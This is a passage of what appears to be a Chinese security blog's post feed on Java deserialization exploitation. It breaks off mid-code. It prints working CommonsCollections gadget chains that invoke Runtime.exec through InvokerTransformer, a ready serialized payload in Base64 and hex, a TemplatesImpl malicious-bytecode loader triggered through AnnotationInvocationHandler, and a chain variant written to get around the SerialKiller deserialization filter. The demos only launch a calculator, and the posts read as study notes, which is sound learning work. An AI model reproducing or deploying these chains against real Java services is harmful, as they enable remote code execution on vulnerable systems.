class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TurnChainToPayload</span> <span class="variable">turner</span> <span class="operator">=</span> TurnChainToPayload.getInstance();</span><br><span class="line">        turner.getPayload(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base64：</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAADYmFyeA==</span><br><span class="line">---------------------</span><br><span class="line">Hex：</span><br><span class="line">ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E00137571007E00180000000174000863616C632E657865740004657865637571007E001B0000000171007E00207371007E00003F4000000000000C77080000001000000000787874000362617278</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections3</title>
      <link href="/2025/04/06/java-cc3/"/>
      <url>/2025/04/06/java-cc3/</url>
      
        <content type="html"><![CDATA[<h3 id="利用TemplatesImpl的任意恶意类加载demo"><a href="#利用TemplatesImpl的任意恶意类加载demo" class="headerlink" title="利用TemplatesImpl的任意恶意类加载demo"></a>利用TemplatesImpl的任意恶意类加载demo</h3><p>上一篇中学习了利用<code>TemplatesImpl</code>加载类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64字节码&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 允许访问私有字段</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合之前生成恶意序列化数据的demo：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以把它们结合一下<br>这样就可以实现加载一个自定义的恶意类<br>执行任何代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span></span><br><span class="line">        com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsIntro2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64字节码&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而在<code>SerialKiller</code>反序列化过滤器中<br>过滤了<code>InvokerTransformer</code><br>那么我们可以选用另外一个链子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>尝试利用前面12篇文章学到的知识构造POC</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>先来一个恶意类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows中利用如下命令对class文件进行取base64编码：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Convert</span>]::ToBase64String([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;CustomClass.class&quot;</span>)) <span class="operator">-replace</span> <span class="string">&quot;`n|`r&quot;</span></span><br></pre></td></tr></table></figure><p>回忆之前的步骤<br>我们先将<code>outerMap</code>触发改为<code>interMap</code>预填充<br>这里键名一定要是<code>&quot;value&quot;</code>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br></pre></td></tr></table></figure><p>再利用<code>AnnotationInvocationHandler​</code>自动触发<code>outermMap</code>的填充</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>将<code>handler</code>序列化并转为base64：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] payload = Base64.getDecoder().decode(<span class="string">&quot;上一步输出的base64&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure><p>成功输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CustomTransletClass loaded</span><br><span class="line">Exception in thread &quot;main&quot; org.apache.commons.collections.FunctorException: InvokerTransformer: The method &#x27;newInstance&#x27; on &#x27;class java.lang.reflect.Constructor&#x27; threw an exception</span><br><span class="line">at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:133)</span><br><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:123)</span><br><span class="line">at org.apache.commons.collections.map.TransformedMap.checkSetValue(TransformedMap.java:204)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java的classloader们</title>
      <link href="/2025/04/03/java-classloaders/"/>
      <url>/2025/04/03/java-classloaders/</url>
      
        <content type="html"><![CDATA[<p>之前在CC1和CC6的链子中<br>一开始都使用了反射调用<code>Runtime.class</code><br>这里的<code>.class</code>对象是类被jvm加载时创建的元数据</p><p>而jvm需要加载一个类时<br>会去磁盘上加载<code>.class</code>文件<br>这里的<code>.class</code>文件是源码编译后的二进制字节码数据</p><p>既然是字节码数据那么和反序列化时使用的序列化数据一样<br>很多不是可见字符，需要借助编码等方式进行直接传输</p><p>当然还有远程加载的方法：</p><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:80/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码会在80端口的本地网站根目录下加载一个<code>Hello.class</code></p><h3 id="加载的过程"><a href="#加载的过程" class="headerlink" title="加载的过程"></a>加载的过程</h3><p>加载的过程经历了三个函数：</p><ul><li><code>ClassLoader.loadclass</code></li></ul><p>双亲委派模型：<br>首先检查类是否已加载（通过 <code>findLoadedClass</code>）。<br>若未加载，优先委派给父类加载器（<code>parent.loadClass</code>），<br>父类无法加载时，才调用自身的 <code>findClass</code>。<br>这种分层设计保证了核心类库（如 <code>java.lang</code>）<br>由启动类加载器（<code>Bootstrap ClassLoader</code>）加载，<br>避免重复加载和安全性问题。</p><p>但是这个名字我觉得有翻译问题<br>应该叫<strong>父类委派模型</strong><br>否则的话可能会造成有两个父类链的误解</p><ul><li><code>ClassLoader.findclass</code></li></ul><p>一路向上直到委派到目标后<br>执行目标类自定义的<code>findClass</code><br>从文件、网络等获取类的字节码</p><ul><li><code>ClassLoader.defineclass</code></li></ul><p>当<code>findclass</code>成功读取字节码后，<br>传给<code>defineclass</code><br>将字节码转换为<code>Class</code>对象</p><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.org.apache.xalan.internal.xsltc.trax;</span><br></pre></td></tr></table></figure><p>这个包中的<code>TemplatesImpl</code>有一个内部类<code>TransletClassLoader</code><br>他重写了加载字节码的<code>defineclass</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个重写的操作使得原本被<code>protect</code>的<code>defineClass</code>方法<br>变成了<code>default</code>（可以理解为包内<code>public</code>）<br>那我们找找包内有没有<code>public</code>方法使用了它<br>如果有的话我们就可以在外部调用它了<br>有一条调用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() --&gt;</span><br><span class="line">TemplatesImpl#newTransformer() --&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() --&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() --&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>前两行都是<code>public</code><br>这里写个DEMO:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 